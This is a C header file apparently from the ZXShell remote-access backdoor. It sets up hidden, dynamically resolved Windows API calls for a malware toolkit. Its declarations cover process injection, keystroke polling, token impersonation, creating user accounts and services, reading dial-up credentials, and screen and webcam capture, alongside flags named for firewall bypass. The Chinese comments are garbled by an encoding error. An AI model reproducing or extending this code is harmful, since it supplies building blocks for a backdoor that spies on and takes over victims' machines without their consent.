#if !defined _ZX_FAKE_WINAPI

#define _ZX_FAKE_WINAPI


#include <winsock2.h>
#include <windows.h>
#include <tchar.h>
#include <wchar.h>
#include <psapi.h>
#include <malloc.h>
#include <stdio.h>


#ifdef _ZXSHELL

//#define _ZXS_PRIVATE

#endif

//�������� �� ����ͨ����ǽ�� ���ܴ���
#define _AntiBadFirewall

//�������� �� ͨ��IE�������ӵ� ���ܴ���
//#define _AntiFirewall

//#define _INSERT_SPAM_CODE

#if defined _ZXS_CLIENT
#undef _ZXS_PRIVATE
#endif



typedef void * WINAPI ZXGetProcAddress(LPCTSTR ModuleName, LPCTSTR APIName);

extern ZXGetProcAddress *zxGetProcAddress;

void _zxmemcpy(
	void *argv1,
	void *argv2,
	size_t argv3);

void * WINAPI memGetProcAddress(LPCTSTR ModuleName, LPCTSTR APIName);


#if defined _ZXS_PRIVATE
	#define ZXSAPI ZXShellSubtleAPI
#else
	#define ZXSAPI
#endif

#if defined _ZXS_PRIVATE

#define memcpy		ZXSAPI::_zx_memcpy
#define memcmp		ZXSAPI::_zx_memcmp
#define stricmp		ZXSAPI::_zx_stricmp
#define strcpy		ZXSAPI::_zx_strcpy
#define strcat		ZXSAPI::_zx_strcat
//#define strlen		ZXSAPI::_zx_strlen
#define sprintf		ZXSAPI::_zx_sprintf
#define _snprintf	ZXSAPI::_zx__snprintf

#define CloseHandle	ZXSAPI::zxCloseHandle
#define closesocket	ZXSAPI::zxclosesocket

#endif


//MessageBox(0, #c, "initialization error", MB_ICONERROR); return FALSE;
#define _GetProcAddr(a,b,c) \
	if(zxGetProcAddress(b, c) == NULL) {\
		__printf("initializtion error: \"%\"s\r\n", c); return FALSE;\
	}else{\
	__asm mov a, eax\
	}



#include "zxsAPI/zxsAPI_Kernel32.h"
#include "zxsAPI/zxsAPI_urlmon.h"
#include "zxsAPI/zxsAPI_User32.h"
#include "zxsAPI/zxsAPI_AdvAPI32.h"
#include "zxsAPI/zxsAPI_WS2_32.h"
#include "zxsAPI/zxsAPI_WININET.h"
#include "zxsAPI/zxsAPI_NETAPI32.h"
#include "zxsAPI/zxsAPI_DNSAPI.h"
#include "zxsAPI/zxsAPI_Gdi32.h"

#include "zxsAPI/zxsAPI_msvcrt.h"
#include "zxsAPI/zxsAPImix.h"

namespace ZXShellSubtleAPI
{

BOOL InitZXGetProcAddrFunc();
BOOL InitZXShellSubtleAPI();

//////////////////////////////////

//Kernel32
extern ZXCreateFile CreateFile;//!
extern ZXRemoveDirectory RemoveDirectory;//!
extern ZXMoveFile MoveFile;//!
extern ZXWinExec WinExec;//!
extern ZXLoadLibraryEx LoadLibraryEx;//!
extern _ZXCreateToolhelp32Snapshot *CreateToolhelp32Snapshot;//!
extern ZXOpenProcess OpenProcess;//!
extern ZXReadProcessMemory ReadProcessMemory;//!
extern ZXCreateProcess CreateProcess;//!
extern ZXTerminateProcess TerminateProcess;//!
extern ZXCreateRemoteThread CreateRemoteThread;//!
extern ZXWriteProcessMemory WriteProcessMemory;//!
extern ZXCreatePipe CreatePipe;//!
extern ZXMoveFileEx MoveFileEx;//!
extern ZXFindFirstFile FindFirstFile;//!
extern ZXLoadLibrary LoadLibrary;//!
extern ZXCreateThread CreateThread;//!
extern WinGetProcAddress GetProcAddress;

extern ZXlstrcpy lstrcpy;
extern ZXGetCurrentProcess GetCurrentProcess;
extern ZXGetModuleHandle GetModuleHandle;
extern ZXGetModuleFileName GetModuleFileName;
extern ZXWriteFile WriteFile;
extern ZXReadFile ReadFile;

extern _ZXGetEnvironmentVariable *GetEnvironmentVariableW;
extern _ZXGetVersionEx *GetVersionEx;
extern _ZXCreateMutex *CreateMutex;
extern _ZXFreeLibrary *FreeLibrary;
extern _ZXVirtualAlloc *VirtualAlloc;
extern _ZXVirtualProtect *VirtualProtect;
extern _ZXVirtualFree *VirtualFree;
extern _ZXCloseHandle *zxCloseHandle;//~~~
extern _ZXVirtualAllocEx *VirtualAllocEx;

extern _ZXGetThreadContext    *GetThreadContext;
extern _ZXVirtualQueryEx      *VirtualQueryEx;
extern _ZXVirtualProtectEx    *VirtualProtectEx;
extern _ZXSetThreadContext    *SetThreadContext;
extern _ZXResumeThread        *ResumeThread;

//msvcrt
extern	_vc_memcpy     *_zx_memcpy;
extern	_vc_memcmp     *_zx_memcmp;
extern	_vc_stricmp    *_zx_stricmp;
extern	_vc_strcpy     *_zx_strcpy;
extern	_vc_strcat     *_zx_strcat;
extern	_vc_strlen     *_zx_strlen;
extern	_vc_sprintf    *_zx_sprintf;
extern	_vc__snprintf  *_zx__snprintf;

//urlmon
//extern ZXURLDownloadToFile URLDownloadToFile;

//User32
extern	ZXExitWindowsEx ExitWindowsEx;
extern	_ZXGetKeyState *GetKeyState;
extern	_ZXGetAsyncKeyState *GetAsyncKeyState;
extern	_ZXMapVirtualKeyEx *MapVirtualKeyExA;

//AdvAPI32
extern ZXRegOpenKey RegOpenKey;
extern ZXRegisterServiceCtrlHandler RegisterServiceCtrlHandler;
extern ZXOpenProcessToken OpenProcessToken;//!
extern 	_ZXRegRestoreKey         *RegRestoreKey;
extern 	_ZXRegSaveKey            *RegSaveKey;
extern 	_ZXCreateService         *CreateService;
extern 	_ZXStartService          *StartService;
extern 	_ZXRegCreateKeyEx        *RegCreateKeyEx;
extern 	_ZXRegSetValueEx         *RegSetValueEx;
extern 	_ZXRegOpenKeyEx          *RegOpenKeyEx;
extern 	_ZXCreateProcessAsUser   *CreateProcessAsUser;
extern 	_ZXDuplicateTokenEx      *DuplicateTokenEx;
extern 	_ZXSetTokenInformation   *SetTokenInformation;
extern 	_ZXRegCreateKey          *RegCreateKey;
extern 	_ZXOpenSCManager         *OpenSCManager;
extern 	_ZXRegQueryValueEx         *RegQueryValueEx;

extern 	_ZXRevertToSelf			 *RevertToSelf;
extern 	_ZXLookupPrivilegeValue	 *LookupPrivilegeValue;
extern 	_ZXAdjustTokenPrivileges *AdjustTokenPrivileges;
extern 	_ZXImpersonateLoggedOnUser *ImpersonateLoggedOnUser;
extern 	_ZXLookupAccountSid *LookupAccountSid;
extern 	_ZXLookupAccountSidW *LookupAccountSidW;
extern 	_ZXOpenThreadToken *OpenThreadToken;


//WS2_32
extern _ZXWSADuplicateSocket *WSADuplicateSocketA;
extern _ZXWSASocket *WSASocketA;
extern ZXsocket socket;
extern ZXlisten listen;
extern ZXconnect connect;
extern ZXbind bind;
extern ZXaccept accept;
extern _ZXsend *send;
extern _ZXrecv *recv;
extern _ZXrecvfrom *recvfrom;
extern _ZXsendto *sendto;
extern _ZXclosesocket *zxclosesocket;//~~~

//WININET
extern _ZXInternetOpen               	*InternetOpen;
extern _ZXFtpOpenFile                	*FtpOpenFile;
extern _ZXInternetConnect            	*InternetConnect;
extern _ZXInternetOpenUrl            	*InternetOpenUrl;
extern _ZXInternetWriteFile          	*InternetWriteFile;
extern _ZXInternetCloseHandle        	*InternetCloseHandle;
extern _ZXInternetQueryDataAvailable 	*InternetQueryDataAvailable;
extern _ZXInternetReadFile           	*InternetReadFile;

//NETAPI32
extern _ZXNetUserAdd *NetUserAdd;
extern _ZXNetLocalGroupAddMembers *NetLocalGroupAddMembers;
extern _ZXNetUserSetInfo *NetUserSetInfo;
extern _ZXNetUserDel *NetUserDel;
extern _ZXNetApiBufferFree *NetApiBufferFree;
extern _ZXNetUserEnum *NetUserEnum;

//DNSAPI
extern	_ZXDnsQuery *DnsQuery;
extern	_ZXDnsRecordListFree *DnsRecordListFree;

//Gdi32
extern	ZXGetStockObject               	GetStockObject;
extern	ZXCreateDC					  	CreateDC;
extern	ZXCreateCompatibleDC           	CreateCompatibleDC;
extern	ZXCreateCompatibleBitmap       	CreateCompatibleBitmap;
extern	ZXDeleteDC                     	DeleteDC;
extern	ZXGdiFlush                     	GdiFlush;
extern	ZXBitBlt                       	BitBlt;
extern	ZXGetDIBits                    	GetDIBits;
extern	ZXDeleteObject                 	DeleteObject;
extern	ZXGetBitmapBits                	GetBitmapBits;
extern	ZXSetPixel                     	SetPixel;
extern	ZXSelectObject                 	SelectObject;
extern	ZXCreateBitmap                 	CreateBitmap;
extern	ZXGetObject                   	GetObject;
extern	ZXGetDeviceCaps                	GetDeviceCaps;;
extern	ZXRealizePalette               	RealizePalette;
extern	ZXSelectPalette                	SelectPalette;
extern	ZXCreatePalette                	CreatePalette;
extern	ZXGetSystemPaletteEntries      	GetSystemPaletteEntries;


//mix api

extern	_ZXcapCreateCaptureWindow *capCreateCaptureWindow;
extern	_ZXcapGetDriverDescription *capGetDriverDescription;

extern	_ZXRasEnumEntries *RasEnumEntries;
extern	_ZXRasGetEntryDialParams *RasGetEntryDialParams;


extern	_ZXEnumProcesses                *EnumProcesses;
extern	_ZXGetModuleInformation			*GetModuleInformation;
extern	_ZXGetModuleBaseName			*GetModuleBaseName;
extern	_ZXGetModuleFileNameEx			*GetModuleFileNameEx;
extern	_ZXEnumProcessModules			*EnumProcessModules;




}



#endif //_ZX_FAKE_WINAPI
